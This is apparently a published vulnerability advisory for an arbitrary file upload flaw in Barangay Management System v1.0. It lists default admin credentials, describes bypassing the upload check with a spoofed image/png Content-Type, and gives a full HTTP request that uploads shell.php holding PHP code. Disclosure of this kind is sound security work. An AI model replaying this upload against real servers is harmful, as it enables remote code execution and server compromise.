# Barangay Management System v1.0 by itsourcecode.com has arbitrary code execution (RCE)

The decompression password for the source file is itsourcecode.

Login account: admin/admin (Super Admin account)

Vulnerability url: ip/bmis/pages/activity/activity.php

vendors: https://itsourcecode.com/free-projects/php-project/barangay-management-system-project-in-php-with-source-code/

Loophole location: Background management system Activity module editing function-> "activity.php" file picture upload point exists arbitrary file upload vulnerability (RCE).

Click "Save" to save

Content-Type: image/png //Key points (Bypass detection by changing "Content Type" to "Content-Type: image/png")

Request package for file upload：

```sql
POST /bmis/pages/activity/activity.php HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://192.168.1.19/bmis/pages/activity/activity.php
Cookie: PHPSESSID=fbu82ocu8kd37b5b20uqq71a35; _ga=GA1.1.1382961971.1655097107; _gid=GA1.1.804632123.1655097107
Connection: close
Content-Type: multipart/form-data; boundary=---------------------------231533211823565
Content-Length: 625

-----------------------------231533211823565
Content-Disposition: form-data; name="txt_doc"

1
-----------------------------231533211823565
Content-Disposition: form-data; name="txt_act"

1
-----------------------------231533211823565
Content-Disposition: form-data; name="txt_desc"

1
-----------------------------231533211823565
Content-Disposition: form-data; name="files[]"; filename="shell.php"
Content-Type: image/png //Key points

JFJF
<?php phpinfo();?>
-----------------------------231533211823565
Content-Disposition: form-data; name="btn_add"

Add Activity
-----------------------------231533211823565--

```

The files will be uploaded to this directory \bmis\pages\activity\photo\
![image](https://user-images.githubusercontent.com/54017627/173300631-ca669f43-c047-404d-9e71-805109debf24.png)

We visited the directory of the file in the browser and found that the code had been executed
![image](https://user-images.githubusercontent.com/54017627/173300781-16024f4f-e01f-4126-90c1-22fbabae9a55.png)

